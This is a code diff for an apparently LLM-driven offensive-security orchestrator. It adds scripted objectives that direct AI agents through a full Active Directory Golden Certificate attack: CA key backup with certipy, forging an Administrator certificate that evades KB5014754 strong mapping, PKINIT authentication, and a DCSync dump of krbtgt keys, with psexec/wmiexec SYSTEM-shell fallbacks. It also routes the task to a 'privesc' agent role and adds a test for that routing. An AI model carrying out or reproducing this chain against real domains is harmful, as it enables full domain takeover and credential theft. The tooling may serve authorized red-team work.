@@ -33,6 +33,33 @@ use tracing::{debug, info, warn};
 use crate::orchestrator::dispatcher::Dispatcher;
 use crate::orchestrator::state::*;
 
+/// Role the Golden Cert pipeline dispatches to. See Bug D — only the
+/// `privesc` role exposes `certipy_ca` / `certipy_forge` / `certipy_auth`.
+const GOLDEN_CERT_TARGET_ROLE: &str = "privesc";
+
+/// Step-by-step LLM objectives for the Golden Cert pipeline. Pulled out
+/// of the dispatch site so the playbook-mandated `-template`/`-sid` and
+/// `ETYPE_NOSUPP`-on-auth instructions can be regression-tested directly.
+///
+/// The 5-step shape (backup → req → forge -template → auth → DCSync) is
+/// load-bearing on modern KDCs: a 3-step backup→forge→auth chain produces
+/// a cert missing `extendedKeyUsage` / `keyUsage` / CDP / AIA, and the
+/// KDC rejects PKINIT with `KDC_ERROR_CLIENT_NOT_TRUSTED(Reserved for
+/// PKINIT)` even though the CA signature is valid. The legitimate cert
+/// from step 2 is cloned via `-template` into step 3 so the forged cert
+/// inherits the full extension set.
+fn golden_cert_objectives() -> Vec<&'static str> {
+    vec![
+        "Step 1 (backup): run `certipy_ca` with backup=true, ca=<discovered CA name>, username/password from credential, dc_ip=<DC for this domain>. Requires SYSTEM or CA admin on the CA host — since this host is owned, you can also run a SYSTEM shell (psexec/wmiexec) and execute certipy locally.",
+        "Step 2 (template cert): run `certipy_req` as the foothold user (username/password from credential) against the same CA with template=User. This produces a legitimately-issued end-entity cert. Keep the resulting .pfx — step 3 needs it. Skipping this step is the most common failure: `certipy_forge` with only `-upn`/`-sid` produces a cert that is missing `extendedKeyUsage`, `keyUsage`, and CDP/AIA extensions, and the KDC rejects PKINIT with `KDC_ERROR_CLIENT_NOT_TRUSTED(Reserved for PKINIT)` even though the CA signature is valid.",
+        "Step 3 (forge): run `certipy_forge` with ca_pfx=<the .pfx from step 1>, template=<the .pfx from step 2>, upn=`administrator@<domain>`, sid=`<domain_sid>-500` (provided in payload as `admin_sid` when known). The `template` flag clones the legit cert's full extension set into the forged Administrator cert so the KDC accepts it; the `sid` flag satisfies KB5014754 strong mapping enforcement.",
+        "Step 4 (auth): run `certipy_auth` with pfx_path=<forged pfx from step 3>, domain=<domain>, dc_ip=<DC IP>. PKINIT yields an Administrator TGT (saved as `<user>.ccache`). The line `Failed to extract NT hash: KDC_ERR_ETYPE_NOSUPP` is BENIGN — it means the KDC has RC4 disabled for the u2u step; the TGT itself is issued correctly and is what step 5 needs. Do NOT retry step 4 on that error.",
+        "Step 5 (DCSync): run `secretsdump` with `-k -no-pass` and `KRB5CCNAME=<administrator.ccache from step 4>` against the DC, plus `-just-dc-user krbtgt` to extract the krbtgt NTLM/AES keys. Use target string `<domain>/administrator@<dc-fqdn>`. Successful output contains `krbtgt:502:aad3b435…:<NT>:::` — that's Domain Admin.",
+        "If you don't yet know the CA name, run `certipy_find` first against this host to discover it (the CA's `Name` / `DNS Name`).",
+        "If `certipy_ca -backup` fails with an RPC/perm error from a network cred, fall back to a local SYSTEM shell (psexec/wmiexec to ca_host) and run certipy from there — the host is owned.",
+    ]
+}
+
 /// Watches for owned CA hosts and dispatches Golden Certificate pipelines.
 /// Interval: 30s.
 pub async fn auto_golden_cert(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
@@ -72,13 +99,7 @@ pub async fn auto_golden_cert(dispatcher: Arc<Dispatcher>, mut shutdown: watch::
                 },
                 "username": item.credential.username,
                 "password": item.credential.password,
-                "objectives": [
-                    "Step 1 (backup): run `certipy_ca` with backup=true, ca=<discovered CA name>, username/password from credential, dc_ip=<DC for this domain>. Requires SYSTEM or CA admin on the CA host — since this host is owned, you can also run a SYSTEM shell (psexec/wmiexec) and execute certipy locally.",
-                    "Step 2 (forge): run `certipy_forge` with ca_pfx=<the .pfx produced in step 1>, upn=`administrator@<domain>`. Output is a forged client-auth certificate signed by the CA private key — no DC interaction needed.",
-                    "Step 3 (auth): run `certipy_auth` with pfx_path=<forged pfx>, domain=<domain>, dc_ip=<DC IP> to PKINIT-authenticate as administrator and recover the NT hash.",
-                    "If you don't yet know the CA name, run `certipy_find` first against this host to discover it (the CA's `Name` / `DNS Name`).",
-                    "If `certipy_ca -backup` fails with an RPC/perm error from a network cred, fall back to a local SYSTEM shell (psexec/wmiexec to ca_host) and run certipy from there — the host is owned.",
-                ],
+                "objectives": golden_cert_objectives(),
             });
 
             if let Some(ref dc) = item.dc_ip {
@@ -93,9 +114,18 @@ pub async fn auto_golden_cert(dispatcher: Arc<Dispatcher>, mut shutdown: watch::
                 payload["admin_sid"] = json!(format!("{sid}-500"));
             }
 
+            // Bug D: route to `privesc` — the only role whose tool registry
+            // exposes `certipy_ca`, `certipy_forge`, and `certipy_auth`
+            // (see `tools_for_role` in `ares-llm/src/tool_registry/mod.rs`).
+            // The previous routing to `credential_access` produced
+            //   "Cannot execute requested 'golden_cert' exploitation steps
+            //    because required tools (certipy_ca/certipy_forge/certipy_auth,
+            //    certipy_find, and remote exec like psexec/wmiexec) are not
+            //    available in this agent's toolset."
+            // on every dispatch, then failed the task.
             let priority = dispatcher.effective_priority("golden_cert");
             match dispatcher
-                .throttled_submit("exploit", "credential_access", payload, priority)
+                .throttled_submit("exploit", GOLDEN_CERT_TARGET_ROLE, payload, priority)
                 .await
             {
                 Ok(Some(task_id)) => {
@@ -499,6 +529,31 @@ mod tests {
         assert_eq!(work.len(), 1);
         // Dedup key uses lowercase IP (already lowercase here) and lowercase domain
         assert_eq!(work[0].dedup_key, "192.168.58.50:contoso.local");
+    }
+
+    #[test]
+    fn auto_golden_cert_routes_to_role_with_certipy_tools() {
+        // Bug D: the role the Golden Cert pipeline dispatches to must expose
+        // the certipy_* triad in its tool registry. Only `Privesc` does — the
+        // previous `credential_access` routing produced the
+        //   "certipy_ca/certipy_forge/certipy_auth ... not available in this
+        //    agent's toolset"
+        // failure on every dispatch.
+        use ares_llm::tool_registry::{tools_for_role, AgentRole};
+        let role = GOLDEN_CERT_TARGET_ROLE;
+        assert_eq!(
+            role, "privesc",
+            "auto_golden_cert must route to the 'privesc' role"
+        );
+        let tools = tools_for_role(AgentRole::Privesc);
+        let names: std::collections::HashSet<&str> =
+            tools.iter().map(|t| t.name.as_str()).collect();
+        for required in &["certipy_ca", "certipy_forge", "certipy_auth"] {
+            assert!(
+                names.contains(required),
+                "Privesc role registry missing required tool '{required}'"
+            );
+        }
     }
 
     #[test]
